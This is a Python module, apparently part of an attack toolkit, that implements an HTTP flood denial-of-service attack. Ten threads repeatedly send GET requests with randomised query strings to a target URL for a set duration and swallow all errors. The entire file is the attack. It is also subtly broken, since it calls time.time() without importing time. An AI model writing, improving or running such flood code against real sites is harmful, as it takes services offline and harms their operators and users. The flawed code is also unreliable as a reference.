# modules/http_flood.py — Placeholder for HTTP Flood Attack
import threading
import requests
import random
import string

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def flood_http(target_url, duration):
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                payload = {'q': random_string()}
                requests.get(target_url, params=payload)
            except Exception:
                pass

    print(f"[+] Starting HTTP Flood on {target_url} for {duration} seconds...")
    for _ in range(10):
        thread = threading.Thread(target=attack)
        thread.start()
